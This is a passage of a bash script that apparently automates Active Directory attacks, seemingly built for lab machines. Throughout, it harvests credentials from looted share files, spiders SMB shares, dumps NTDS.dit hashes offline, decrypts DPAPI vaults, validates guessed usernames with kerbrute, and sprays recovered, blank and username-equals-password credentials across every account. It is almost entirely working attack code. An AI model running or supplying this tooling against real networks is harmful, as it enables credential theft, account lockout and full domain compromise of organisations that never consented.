        *)         [[ -d "$dec" ]] && txt=$(find "$dec" -type f -exec cat {} + 2>/dev/null) || txt=$(strings -n 4 "$dec" 2>/dev/null) ;;
    esac
    printf '%s\n' "$txt" | grep -vE '^\s*$' | sort -u | tee "$OUTDIR/content_${base}.txt" | head -40
    harvest_secrets <<<"$txt" "$base"
}

# Pull likely passwords out of free text and feed them to the engine.
# Strategy: (1) keyword-anchored secrets (high confidence), (2) a few standalone
# strong tokens (upper+lower+digit, len>=8). Junk (paths/xml) is filtered out.
# Reject things that look harvested but aren't passwords: GUIDs, hex/0x literals,
# pure numbers, and long base64/hex blobs (keys, not creds). Keeps real ones
# like football1 / M1XyC9pW7qT5Vn while dropping {GUID}, 0x01C0…, base64 keys.
_plausible_secret() {
    # NOTE: keep these on separate lines. `local s="$1" n=${#s}` expands ${#s}
    # against the CALLER's `s` (dynamic scope), not the one just assigned — so n
    # would be wrong (0, or the caller's length) unless the caller happens to use
    # a var named `s`. That silently broke DPAPI ingestion (caller var was `p`).
    local s="$1"; local n=${#s}
    (( n < 6 || n > 40 )) && return 1
    [[ "$s" =~ \.(txt|json|log|csv|zip|ccache|htb|local|lan|com|net|org)$ ]] && return 1       # files/hostnames/domains
    [[ "$s" =~ ^[A-Za-z0-9._-]+\.[A-Za-z0-9._-]+\.[A-Za-z]{2,}$ ]] && return 1                # fqdn
    [[ "$s" =~ ^[A-Za-z]{6,12}$ ]] && return 1                                                # weak word fragments
    [[ "$s" =~ ^[A-Z]{6,12}$ ]] && return 1                                                    # all-caps fragments
    [[ "$s" =~ ^\{?[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\}?$ ]] && return 1   # GUID
    [[ "$s" =~ ^0[xX][0-9a-fA-F]+$ ]] && return 1                                          # hex literal
    [[ "$s" =~ ^[0-9a-fA-F]{16,}$ ]] && return 1                                           # long pure hex
    [[ "$s" =~ ^[0-9]+$ ]] && return 1                                                     # pure number
    # long token with NO special char and NOT clearly a passphrase → likely a key/blob
    (( n > 26 )) && [[ ! "$s" =~ [^A-Za-z0-9] ]] && return 1
    return 0
}

harvest_secrets() {
    local label="${1:-text}" text; text=$(cat)
    local -a hits=()
    local added=0

    # (0) USER↔PASS PAIRS — capture the *associated account*, not just the loose
    # password. Logs/configs/connection-strings almost always leak both together
    # (e.g. `BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025"`);
    # pairing them lets us validate a REAL credential (queue_cred → tested as that
    # user) instead of blind-spraying the password across every account. Broad
    # label set + connstring / URL / CLI forms so we recognise the common shapes:
    #   BindUser/BindPass · User|Username|UID|Login|Account : / =  Password|Pwd|Secret
    #   User ID=…;Password=…   user=…&pass=…   DOMAIN\user / user@dom (stripped)
    #   scheme://user:pass@host   -u USER -p PASS   -U USER%PASS   net use … /user:
    local _uL='(?:bind[ _]?user|user(?:[ _]?id|name)?|uid|login|logon|account|acct|svc[ _]?acct|service[ _]?account|principal|member|/user)'
    local _pL='(?:bind[ _]?pass(?:word)?|pass(?:word)?|pwd|passwd|secret|credential|api[ _-]?key|token)'
    local line u p up cu cp
    while IFS= read -r line; do
        u=$(printf '%s' "$line" | grep -oiP "${_uL}\s*[:=]\s*[\"']?\K[^\"',;}\s]+" | head -1)
        p=$(printf '%s' "$line" | grep -oiP "${_pL}\s*[:=]\s*[\"']?\K[^\"',;}\s]+" | head -1)
        # URL form: scheme://user:pass@host
        if [[ -z "$u" || -z "$p" ]]; then
            up=$(printf '%s' "$line" | grep -oiP '://\K[^:/@\s]+:[^@/\s]{4,}(?=@)' | head -1)
            [[ -n "$up" ]] && { u="${up%%:*}"; p="${up#*:}"; }
        fi
        # CLI form: -u USER -p PASS   /   -U USER%PASS
        if [[ -z "$u" || -z "$p" ]]; then
            cu=$(printf '%s' "$line" | grep -oiP '(?:^|\s)-[uU]\s+\K\S+' | head -1)
            cp=$(printf '%s' "$line" | grep -oiP '(?:^|\s)-p\s+\K\S+'    | head -1)
            if [[ -z "$cu" ]]; then          # -U DOMAIN/USER%PASS (impacket/nxc)
                up=$(printf '%s' "$line" | grep -oiP '(?:^|\s)-U\s+\K\S+%\S+' | head -1)
                [[ -n "$up" ]] && { cu="${up%%%*}"; cp="${up#*%}"; }
            fi
            [[ -n "$cu" && -n "$cp" ]] && { u="$cu"; p="$cp"; }
        fi
        [[ -z "$u" || -z "$p" ]] && continue
        u="${u##*\\}"; u="${u##*/}"; u="${u%%@*}"      # strip DOMAIN\  user/  @domain
        _is_valid_identity "$u" || continue
        _plausible_secret "$p"  || continue
        loot "★ Credential PAIR harvested from ${label}: ${C_GREEN}${C_BOLD}${u} : ${p}${C_RESET}"
        # Year-adaptation, lockout-safe. Do NOT add the raw literal to the spray
        # pool: a stale-year literal is a WRONG guess that would be sprayed across
        # every user and lock accounts. Probe (current-year sibling FIRST), then
        # record + queue ONLY the best/validated password. Runs once per account.
        local best="$p"
        [[ -z "${SEEN_CREDS[${u,,}]:-}" ]] && best="$(_probe_year_password "$u" "$p")"
        [[ -z "$best" ]] && best="$p"
        add_secret "$best" "harvested cred pair from $label"
        [[ "$best" != "$p" ]] && loot "★ Year-adapted: ${u} -> ${C_GREEN}${C_BOLD}$best${C_RESET} (log carried a stale year)"
        queue_cred "$u" "$best" "" "harvested cred pair from $label"
        added=$((added+1))
    done < <(printf '%s\n' "$text" | grep -iE 'user|login|logon|account|acct|pass|pwd|secret|credential|principal|://|(^|[[:space:]])-[uUpP]([[:space:]]|$)' 2>/dev/null)

    # (1) "password/pwd/reset to/set to/secret : X"  →  X
    while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
        printf '%s\n' "$text" | grep -oiP '\b(password|passwd|pwd|pass(?:word)?|reset to|set to|secret|creds?)\b\s*(?:is|was|to|[:=])?\s*\K[A-Za-z0-9!@#$%^&*._-]{6,40}' )
    # (2) standalone strong tokens (capped to avoid lockout-spray noise)
    while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
        printf '%s\n' "$text" | grep -oP '\b(?=[A-Za-z0-9!@#$%^&*._-]*[A-Z])(?=[A-Za-z0-9!@#$%^&*._-]*[a-z])(?=[A-Za-z0-9!@#$%^&*._-]*[0-9])[A-Za-z0-9!@#$%^&*._-]{8,40}\b' | sort -u | head -8 )
    local s
    for s in "${hits[@]}"; do
        # filter obvious non-secrets
        [[ "$s" =~ ^(password|passwd|reset|account|domain|admin|user|users|remote|management)$ ]] && continue
        [[ "$s" == */* || "$s" == *\\* ]] && continue   # paths are not passwords
        # FILENAMES masquerade as strong tokens (Bginfo64.exe, PsExec64.exe have
        # upper+lower+digit) — drop anything ending in a known file extension.
        [[ "$s" =~ \.(xml|bin|rels|png|jpg|jpeg|gif|bmp|svg|csv|ini|inf|pol|log|log1|log2|htb|local|exe|dll|sys|msi|msu|bat|cmd|ps1|psm1|vbs|com|cat|mui|tmp|dat|db|bak|lnk|url|cfg|config|conf|manifest|regtrans|regtrans-ms|blf|etl|evtx|node|json|txt|md|library-ms|mapimail|desklink|zfsendtotarget)$ ]] && continue
        # NTFS / journal artifacts: TMContainer0000000000000000001, $-prefixed, long zero runs
        [[ "$s" =~ ^[$] || "$s" =~ [Cc]ontainer[0-9]{6,} || "$s" =~ 0{8,} ]] && continue
        _plausible_secret "$s" || continue          # drop GUIDs, hex, blobs, fragments
        if [[ -z "${FOUND_SECRETS[$s]:-}" ]]; then
            loot "Potential password harvested from ${label}: ${C_GREEN}${C_BOLD}$s${C_RESET}"
            add_secret "$s" "harvested from $label"; added=$((added+1))
        fi
    done
    [[ "$added" == "0" ]] && info "No clear passwords harvested from ${label}"
}

# Process NTDS.dit + SYSTEM hive offline to recover all domain hashes
phase_ntds_local() {
    local ntds="$1" system="$2"
    have impacket-secretsdump || return
    subsection "Offline NTDS extraction (secretsdump LOCAL)"
    run "impacket-secretsdump -ntds $ntds -system $system LOCAL"
    impacket-secretsdump -ntds "$ntds" -system "$system" LOCAL -outputfile "$OUTDIR/ntds_local" 2>&1 \
        | tee -a "$LOGFILE" | tee "$OUTDIR/ntds_local.txt"
    if grep -qE ':::' "$OUTDIR/ntds_local.txt" 2>/dev/null; then
        loot "★★★★★ NTDS DUMPED OFFLINE — domain NTLM hashes recovered"
        grep -E ':::' "$OUTDIR/ntds_local.txt" | while read -r line; do
            local u nt; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4)
            echo -e "      ${C_RED}${C_BOLD}$u${C_RESET} : ${C_MAGENTA}$nt${C_RESET}"
        done
        while read -r l; do
            local h; h=$(echo "$l" | cut -d: -f4)
            loot "ADMINISTRATOR hash: $h"; queue_cred "Administrator" "" "$h" "NTDS.dit offline dump"
        done < <(grep -iE '^administrator:' "$OUTDIR/ntds_local.txt" | head -1)
        [[ "$DO_CRACK" == "1" ]] && {
            grep -E ':::' "$OUTDIR/ntds_local.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntds_ntlm.txt"
            crack_hashes "$OUTDIR/ntds_ntlm.txt" 1000 "NTLM"; }
    fi
}

phase_share_loot() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
    [[ "$IS_DC_ADMIN" == "1" ]] && { info "Skipping share spider — ${USER} is DC admin (DCSync covers everything)"; return; }
    section "SHARE LOOTING · INTERESTING FILES"
    local args; mapfile -t args < <(nxc_cred_args)
    local dl="$OUTDIR/shares"; mkdir -p "$dl"

    # Only pull INTERESTING files. Without filters the spider drags down whole
    # roaming/user profiles (browser caches, search indexes, registry tx logs,
    # thumbnails…) — hundreds of junk files that bury real loot and flood the
    # password harvester with garbage tokens. spider_plus is exclude-based, so we
    # strip known-noise extensions and folder/name substrings. DPAPI material is
    # explicitly preserved: masterkeys (GUID, no ext), Credentials (hex, no ext)
    # and Vault (.vpol/.vcrd) match no exclusion below, and the Protect/
    # Credentials/Vault folders aren't filtered → offline DPAPI still gets fed.
    # NOTE: EXCLUDE_FILTER substrings must be space-free (nxc -o is space-split).
    local skip_exts="ico,lnk,db,db-wal,db-shm,ldb,log,dat,tmp,blf,regtrans-ms,pma,chk,etl,evtx,jfm,mui,cat,manifest,sqlite,sqlite-wal,sqlite-shm,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,sst,cdp,search-ms,url,theme,thmx,automaticdestinations-ms,customdestinations-ms"
    local skip_dirs="ipc\$,Cache,Crashpad,BrowserMetrics,Packages,ConnectedDevicesPlatform,PenWorkspace,Temp,Edge,Chromium,Mozilla,GPUCache,History,Cookies"
    subsection "Spidering readable shares → interesting files only (≤5MB)"
    run "$NXC smb $DCT ${args[*]} -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 EXCLUDE_EXTS=$skip_exts EXCLUDE_FILTER=$skip_dirs OUTPUT_FOLDER=$dl"
    $NXC smb "$DCT" "${args[@]}" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
        EXCLUDE_EXTS="$skip_exts" EXCLUDE_FILTER="$skip_dirs" OUTPUT_FOLDER="$dl" 2>&1 \
        | tail -25 | tee -a "$LOGFILE"

    # --- Non-default shares: pull WITHOUT the noise-extension filter ---------
    # The exclude list above (log,dat,etl,evtx,db,sqlite…) exists to skip Windows
    # profile/registry junk on default shares. But on a CUSTOM share (e.g. one
    # literally named "Logs") those .log/.csv/.txt/.evtx files ARE the loot — the
    # global filter was silently throwing the objective away. spider_plus has no
    # per-share include, but its EXCLUDE_FILTER matches share names too, so we run
    # a second relaxed pass that excludes the default readable shares
    # (SYSVOL/NETLOGON/IPC$) and keeps only a media-binary extension filter. Net
    # effect: every non-default readable share is pulled in full (≤MAX_FILE_SIZE)
    # into the same loot dir, so all downstream harvesting/cracking covers it.
    subsection "Non-default shares → full pull (noise filter relaxed)"
    local readable; readable=$($NXC smb "$DCT" "${args[@]}" --shares --filter-shares read 2>&1 \
        | sed -E 's/^[[:space:]]*[A-Z]+[[:space:]]+\S+[[:space:]]+[0-9]+[[:space:]]+\S+[[:space:]]+//' \
        | awk 'NF>=1{print $1}')
    local DEFAULT_SHARES='ADMIN\$|C\$|IPC\$|PRINT\$|FAX\$|SYSVOL|NETLOGON|Share|-----|Permissions'
    local custom; custom=$(printf '%s\n' "$readable" | grep -viE "^(${DEFAULT_SHARES})$" | sort -u | sed '/^$/d')
    if [[ -n "$custom" ]]; then
        info "Custom readable share(s): $(echo $custom | tr '\n' ' ')"
        # Exclude default readable shares by name + keep the junk-dir filter.
        local cf_skip_dirs="sysvol,netlogon,ipc\$,${skip_dirs}"
        # Minimal extension filter: only true binary media that cannot carry creds.
        local cf_skip_exts="ico,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,mui,cat"
        run "$NXC smb $DCT ${args[*]} -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 EXCLUDE_EXTS=$cf_skip_exts EXCLUDE_FILTER=$cf_skip_dirs OUTPUT_FOLDER=$dl"
        $NXC smb "$DCT" "${args[@]}" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
            EXCLUDE_EXTS="$cf_skip_exts" EXCLUDE_FILTER="$cf_skip_dirs" OUTPUT_FOLDER="$dl" 2>&1 \
            | tail -25 | tee -a "$LOGFILE"
    else
        info "No non-default readable shares (nothing beyond SYSVOL/NETLOGON/IPC\$)"
    fi

    local files; files=$(find "$dl" -type f 2>/dev/null)
    [[ -z "$files" ]] && { info "No files downloaded from shares"; return; }
    loot "$(echo "$files" | wc -l) files pulled from shares → $dl"

    subsection "Hunting credentials inside downloaded files"
    grep -rEisn 'password|passwd|pwd=|connectionstring|secret|api[_-]?key|cpassword' "$dl" 2>/dev/null \
        | grep -vEi '\.(dll|exe|png|jpg)' | head -40 | tee "$OUTDIR/share_secrets.txt"
    [[ -s "$OUTDIR/share_secrets.txt" ]] && loot "Potential secrets in files → share_secrets.txt"
    # Harvest passwords from small text/config files and feed the engine.
    # Skip: SYSVOL/GPO policy trees (GUIDs/registry hex), per-user AppData
    # profiles (browser/app junk → garbage tokens that flood the spray) and
    # desktop.ini stubs. Real share docs (IT/HR/Finance/etc.) are kept.
    # IMPORTANT: feed harvest_secrets via process substitution, NOT a pipe. A pipe
    # runs the RIGHT side in a SUBSHELL, so the queue_cred/add_secret it performs
    # mutate a throwaway CRED_QUEUE/FOUND_SECRETS and are lost on subshell exit —
    # that's exactly why a harvested credential (e.g. svc_recovery from a log)
    # printed "queued" yet was never assessed/pivoted. `< <(...)` keeps
    # harvest_secrets in THIS shell so the in-memory queue actually grows.
    harvest_secrets "shares" < <(find "$dl" -type f -size -200k \
        -not -ipath '*/sysvol/*' -not -ipath '*/policies/*' -not -ipath '*/AppData/*' \
        -not -iname 'desktop.ini' \
        \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
        -o -iname '*.xml' -o -iname '*.ps1' -o -iname '*.bat' -o -iname '*.conf' -o -iname '*.cnf' \
        -o -iname '*.log' -o -iname '*.csv' -o -iname '*.json' -o -iname '*.yml' -o -iname '*.yaml' -o -iname '*.env' \) \
        -exec cat {} + 2>/dev/null)

    subsection "Cracking password-protected documents found on shares"
    while IFS= read -r f; do
        case "${f,,}" in
            *.xls|*.xlsx|*.xlsm|*.doc|*.docx|*.ppt|*.pptx|*.pdf|*.zip|*.rar|*.7z|*.kdbx) crack_file "$f" ;;
            *id_rsa|*.ppk|*.pem|*.key) loot "Private/SSH key found: $f"; echo "$f" >>"$OUTDIR/ssh_keys.txt" ;;
        esac
    done <<<"$files"

    # NTDS + SYSTEM backups → recover everything offline
    local ntds system
    ntds=$(echo "$files"   | grep -iE 'ntds\.dit$' | head -1)
    system=$(echo "$files" | grep -iE '(/|_|\.)SYSTEM(\.(hiv|bak|save|old))?$' | head -1)
    if [[ -n "$ntds" && -n "$system" ]]; then
        loot "★★★ NTDS.dit + SYSTEM hive found in shares!"
        phase_ntds_local "$ntds" "$system"
    fi

    # DPAPI material looted from shares → try to decrypt it offline, automatically
    # here-string, NOT `echo "$files" | grep -q`: under `set -o pipefail`, grep -q
    # matches early and exits, echo dies on SIGPIPE, and the pipeline reports
    # failure even though there WAS a match → the block would be skipped (this is
    # exactly why offline DPAPI silently never ran once the spider pulled enough
    # files for grep to short-circuit before echo finished writing).
    if grep -qiE 'Protect/|Credentials|Vault|masterkey' <<<"$files"; then
        phase_dpapi_offline "$dl"
    fi
}

# ===========================================================================
#  DPAPI OFFLINE  —  decrypt masterkeys + credential/vault blobs looted from
#  shares, using any plaintext password we've recovered. Fully generic: it keys
#  off the standard Windows DPAPI layout (Protect/<SID>/<GUID> masterkeys,
#  Credentials/* and Vault/* blobs), not any specific account.
# ===========================================================================
phase_dpapi_offline() {
    local dl="$1"
    have impacket-dpapi || { warn "impacket-dpapi unavailable — skipping offline DPAPI"; return; }
    [[ ${#FOUND_SECRETS[@]} -eq 0 ]] && return     # need at least one plaintext to try

    local mks creds
    mks=$(find "$dl" -type f -ipath '*protect*' -regextype posix-extended \
            -iregex '.*/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' 2>/dev/null)
    creds=$(find "$dl" -type f \( -ipath '*credentials*' -o -ipath '*vault*' \) ! -iname '*.pol' 2>/dev/null)
    [[ -z "$mks" && -z "$creds" ]] && return

    section "DPAPI · OFFLINE DECRYPTION OF LOOTED BLOBS"
    local -A MKEYS=()        # decrypted masterkey GUID -> hex key
    local mk sid pw out k

    subsection "Decrypting masterkeys with recovered passwords"
    while IFS= read -r mk; do
        [[ -z "$mk" ]] && continue
        sid=$(printf '%s' "$mk" | grep -oiP 'S-1-5-21-[0-9-]+' | head -1)
        [[ -z "$sid" ]] && continue
        for pw in "${!FOUND_SECRETS[@]}"; do
            out=$(impacket-dpapi masterkey -file "$mk" -sid "$sid" -password "$pw" 2>/dev/null)
            k=$(printf '%s' "$out" | grep -oiP 'Decrypted key with User Key.*0x\K[0-9a-f]+|Decrypted key:\s*0x\K[0-9a-f]+' | head -1)
            if [[ -n "$k" ]]; then
                MKEYS["$(basename "$mk")"]="$k"
                loot "★ DPAPI masterkey $(basename "$mk") decrypted (password of SID ${sid})"
                break
            fi
        done
    done <<<"$mks"

    [[ ${#MKEYS[@]} -eq 0 ]] && { info "No DPAPI masterkey could be decrypted with the known passwords"; return; }

    # Pull a (user,password) out of any decrypted DPAPI output and pivot on it
    _dpapi_ingest() {
        local o="$1" src="$2" u p
        u=$(printf '%s' "$o" | grep -oiP 'Username\s*:\s*\K.+'        | head -1 | sed 's#.*\\##' | tr -d '\r ')
        p=$(printf '%s' "$o" | grep -oiP 'Password\s*:\s*\K\S.*'      | head -1 | tr -d '\r')
        [[ -z "$p" ]] && p=$(printf '%s' "$o" | grep -oiP 'Unknown\s*:\s*\K\S.*' | tail -1 | tr -d '\r')
        [[ -n "$p" ]] && _plausible_secret "$p" || return 1
        loot "★★ DPAPI secret recovered → ${C_GREEN}${u:-?} : ${p}${C_RESET}"
        add_secret "$p" "DPAPI offline ($src)"
        [[ -n "$u" ]] && { note_cred_source "${u}:${p}" "DPAPI offline decrypt"; queue_cred "$u" "$p" "" "DPAPI offline decrypt"; }
        return 0
    }

    subsection "Decrypting credential blobs"
    local blob
    while IFS= read -r blob; do
        [[ -z "$blob" ]] && continue
        for k in "${MKEYS[@]}"; do
            out=$(impacket-dpapi credential -file "$blob" -key "0x$k" 2>/dev/null)
            grep -qiE 'Username|Target' <<<"$out" || continue   # here-string: avoid pipefail+SIGPIPE
            _dpapi_ingest "$out" "$(basename "$blob")" && break
        done
    done < <(find "$dl" -type f -ipath '*credentials*' ! -iname '*.pol' 2>/dev/null)

    subsection "Decrypting vault credentials (vpol + vcrd)"
    local vpol vdir vkeys vcrd
    while IFS= read -r vpol; do
        [[ -z "$vpol" ]] && continue
        vdir=$(dirname "$vpol")
        for k in "${MKEYS[@]}"; do
            vkeys=$(impacket-dpapi vault -vpol "$vpol" -key "0x$k" 2>/dev/null | grep -oiP '0x[0-9a-f]{16,}' | head -2 | tr '\n' ' ')
            [[ -z "$vkeys" ]] && continue
            while IFS= read -r vcrd; do
                [[ -z "$vcrd" ]] && continue
                # shellcheck disable=SC2086
                out=$(impacket-dpapi vault -vcrd "$vcrd" -vpolkeys $vkeys 2>/dev/null)
                _dpapi_ingest "$out" "$(basename "$vcrd")"
            done < <(find "$vdir" -type f -iname '*.vcrd' 2>/dev/null)
            break
        done
    done < <(find "$dl" -type f -iname '*.vpol' 2>/dev/null)
}

# ===========================================================================
#  USERNAME VARIANTS  —  derive common AD naming formats and validate them
#  (kerbrute userenum only checks existence → no password attempt, no lockout)
# ===========================================================================
VARIANTS_DONE=0
phase_user_variants() {
    [[ "$VARIANTS_DONE" == "1" || -z "$DOMAIN" || "$CAP_KERBEROS" != "1" ]] && return
    { ! _kerbrute_ok || [[ ! -s "$OUTDIR/users_all.txt" ]]; } && return
    VARIANTS_DONE=1
    section "USERNAME VARIANTS · derive & validate alternate account formats"

    local vf="$OUTDIR/users_variants.txt"
    awk '
    {
      u=tolower($0); print u
      n=split(u,p,/[._-]/)
      if (n>=2) {
        f=p[1]; l=p[n]; fi=substr(f,1,1); li=substr(l,1,1)
        print f; print l
        print f"."l; print f"_"l; print f"-"l; print f l
        print fi l; print fi"."l; print l fi; print l"."f
        print f li; print l f
      }
    }' "$OUTDIR/users_all.txt" 2>/dev/null | sort -u >"$vf"
    # keep only NEW candidates not already known-valid
    comm -23 "$vf" "$OUTDIR/users_all.txt" >"${vf}.new" 2>/dev/null && mv "${vf}.new" "$vf"
    [[ ! -s "$vf" ]] && { info "No new username variants to test"; return; }

    subsection "Validating $(wc -l <"$vf") candidate usernames (kerbrute userenum)"
    run "$KERBRUTE_BIN userenum -d $DOMAIN --dc $DC_IP users_variants.txt"
    "$KERBRUTE_BIN" userenum -d "$DOMAIN" --dc "$DC_IP" "$vf" 2>&1 | tee -a "$LOGFILE" \
        | grep -i 'VALID USERNAME' | grep -oiP '\K[A-Za-z0-9._-]+(?=@)' | sort -u >"$OUTDIR/users_variants_valid.txt"
    if [[ -s "$OUTDIR/users_variants_valid.txt" ]]; then
        loot "New valid accounts via variants:"
        while read -r u; do echo -e "      ${C_GREEN}· $u${C_RESET}"; done <"$OUTDIR/users_variants_valid.txt"
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
    else
        info "No additional accounts discovered from variants"
    fi
}

# ===========================================================================
#  PASSWORD SPRAY  —  spray every recovered password across all known users
#  (this is what turns a single cracked file/hash into domain-wide pivots)
# ===========================================================================
# True only when KERBRUTE_BIN is a real, runnable binary (NOT a directory —
# some installs leave /opt/kerbrute as a folder, and `-x` is true on dirs).
_kerbrute_ok() { [[ -n "$KERBRUTE_BIN" && -f "$KERBRUTE_BIN" && -x "$KERBRUTE_BIN" ]]; }

_confirm_plain_cred() {
    local u="$1" pw="$2" src="${3:-spray}"
    [[ -z "$DOMAIN" ]] && return 0
    have impacket-getTGT || return 0
    local td out rc
    td=$(mktemp -d)
    out=$(cd "$td" && timeout -k 5 20 impacket-getTGT "${DOMAIN}/${u}:${pw}" -dc-ip "$DC_IP" 2>&1)
    rc=$?
    rm -rf "$td"
    if [[ "$rc" -eq 0 ]] && grep -qiE 'Saving ticket|saved in' <<<"$out"; then
        return 0
    fi
    warn "${src} reported ${u} as valid, but TGT validation failed → ignoring as false positive"
    echo "$out" | grep -iE 'KDC_ERR|SessionError|STATUS_|error' | head -2 | sed 's/^/      /' | tee -a "$LOGFILE" >/dev/null
    return 1
}

# Spray a single password across all users and queue any valid hit.
# Uses kerbrute when available; otherwise falls back to netexec (always present),
# so a recovered/harvested password is ALWAYS sprayed → pivots even w/o kerbrute.
#
# NOTE: the result loops use `while … done < <(…)` (process substitution), NOT
# `… | while`. A pipe runs the loop in a SUBSHELL, so queue_cred would mutate a
# throwaway CRED_QUEUE and the new identities would never get pivoted. Keeping
# the loop in the parent shell is what makes the recursive pivot actually work.
# Anonymous seeding spray: try the EMPTY password and username==password across a
# user list. A classic unauthenticated foothold (accounts left blank, must-change
# accounts that still authenticate with the blank/old password). Valid hits AND
# must-change hits are queued so the assessment pivots / resets them (for a blank
# must-change account the empty string IS the old password → _change_expired_password
# resets it). Nothing is hard-coded — the foothold is whichever user the DC accepts.
_seed_anon_weak_spray() {
    local ul="$1"; [[ -s "$ul" ]] || return
    local mode out line u pw lbl nusers; nusers=$(grep -c . "$ul")
    for mode in empty userpass; do
        if [[ "$mode" == empty ]]; then
            lbl="empty password"
            subsection "Empty-password spray × $nusers users"
            run "$NXC smb $DC_IP -u <users> -p '' --continue-on-success"
            out=$($NXC smb "$DC_IP" -u "$ul" -p '' --continue-on-success 2>&1)
        else
            lbl="password==username"
            subsection "username==password spray × $nusers users"
            run "$NXC smb $DC_IP -u <users> -p <users> --no-bruteforce --continue-on-success"
            out=$($NXC smb "$DC_IP" -u "$ul" -p "$ul" --no-bruteforce --continue-on-success 2>&1)
        fi
        printf '%s\n' "$out" >>"$LOGFILE"
        while IFS= read -r line; do
            # nxc tags a login that was DOWNGRADED to the Guest account with "(Guest)".
            # When guest is enabled, ANY username + blank password "succeeds" as Guest —
            # that's NOT a real credential for the named user (e.g. junk like
            # safety.company mined from text). Skip those; keep only true blank-password
            # accounts (a plain [+] with no (Guest)) and must-change ones.
            grep -qi '(Guest)' <<<"$line" && continue
            u=$(grep -oP '\\\K[^\\:]+(?=:)' <<<"$line" | head -1); [[ -z "$u" ]] && continue
            [[ "${u,,}" == "guest" || "${u,,}" == "anonymous" ]] && continue
            pw=""; [[ "$mode" == userpass ]] && pw="$u"
            if grep -qi 'STATUS_PASSWORD_MUST_CHANGE' <<<"$line"; then
                loot "★ ${C_GREEN}${u}${C_RESET} — $lbl accepted but MUST-CHANGE → reset on pivot"
                queue_cred "$u" "$pw" "" "anon spray ($mode, must-change)"
            else
                loot "★ ${C_GREEN}${u} : ${pw:-<empty>}${C_RESET} — valid ($lbl)"
                queue_cred "$u" "$pw" "" "anon spray ($mode)"
            fi
        done < <(grep -iE '\[\+\]|STATUS_PASSWORD_MUST_CHANGE' <<<"$out")
    done
}

_spray_one() {
    local pw="$1" u line
    if _kerbrute_ok; then
        while read -r u; do
            [[ -z "$u" ]] && continue
            _confirm_plain_cred "$u" "$pw" "kerbrute spray" || continue
            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
            note_cred_source "${u}:${pw}" "password spray (kerbrute)"
            queue_cred "$u" "$pw" "" "password spray"
        done < <("$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
                   | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)')
    else
        # netexec fallback: spray this one password across every user over SMB.
        # Use Kerberos (-k) + FQDN when in Kerberos mode — many DCs disable NTLM
        # (STATUS_NOT_SUPPORTED), and Kerberos spray succeeds where NTLM can't.
        local kflag=(); [[ "$KERBEROS" == "1" ]] && kflag=(-k)
        while IFS= read -r line; do
            u=$(echo "$line" | grep -oP '\\\K[^\\:]+(?=:)' | head -1)
            [[ -z "$u" ]] && continue
            # STATUS_PASSWORD_MUST_CHANGE = the password is CORRECT but the account
            # must change it at next logon (the classic anonymous-foothold trick on
            # boxes like Sendai). Queue it with this password — the assessment's
            # getTGT will hit KEY_EXPIRED and _change_expired_password resets it.
            if grep -qi 'STATUS_PASSWORD_MUST_CHANGE' <<<"$line"; then
                loot "★ Valid (MUST-CHANGE) credential → ${C_GREEN}${u} : ${pw}${C_RESET} — will reset on pivot"
                note_cred_source "${u}:${pw}" "spray (must-change → reset)"
                queue_cred "$u" "$pw" "" "spray (must-change)"
                continue
            fi
            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
            note_cred_source "${u}:${pw}" "password spray (nxc)"
            echo "$line" | grep -qi 'Pwn3d' && loot "  ↳ ${u} is LOCAL ADMIN where sprayed"
            queue_cred "$u" "$pw" "" "password spray"
        done < <($NXC smb "$DCT" -u "$OUTDIR/users_all.txt" -p "$pw" "${kflag[@]}" --continue-on-success 2>&1 \
                   | tee -a "$LOGFILE" | grep -iE '\[\+\]|STATUS_PASSWORD_MUST_CHANGE')
    fi
}

phase_password_spray() {
    [[ ! -s "$OUTDIR/users_all.txt" ]] && return
    # need a spray method: kerbrute, or netexec over SMB
    { ! _kerbrute_ok && [[ "$CAP_SMB" != "1" ]]; } && return
    # Dedup key includes the user-list size: when the list GROWS (restored /
    # re-enabled / newly-discovered accounts), every known secret is re-sprayed
    # against the larger set — so a password recovered before a user existed
    # still lands on it (e.g. restore a deleted user → spray its leaked password).
    local pw new=0 ucount; ucount=$(grep -c . "$OUTDIR/users_all.txt")
    for pw in "${!FOUND_SECRETS[@]}"; do [[ -z "${SPRAYED[${pw}@@${ucount}]:-}" ]] && new=1; done

    # 1) Spray recovered secrets (low risk: 1 attempt/user per password)
    if [[ "$new" == "1" ]]; then
        section "PASSWORD SPRAY · recovered secrets × all users"
        for pw in "${!FOUND_SECRETS[@]}"; do
            [[ -n "${SPRAYED[${pw}@@${ucount}]:-}" ]] && continue
            SPRAYED["${pw}@@${ucount}"]=1
            subsection "Spraying a recovered password against ${ucount} users ($(_kerbrute_ok && echo kerbrute || echo netexec))"
            run "spray '<secret>' × users_all.txt"
            _spray_one "$pw"
        done
    fi

    # 2) Domain-focused dictionary spray — OPT-IN (--spray): account-lockout risk
    if [[ "$SPRAY_GEN" == "1" && -s "$DOMAIN_WL" && -z "${SPRAYED[__GEN__]:-}" ]]; then
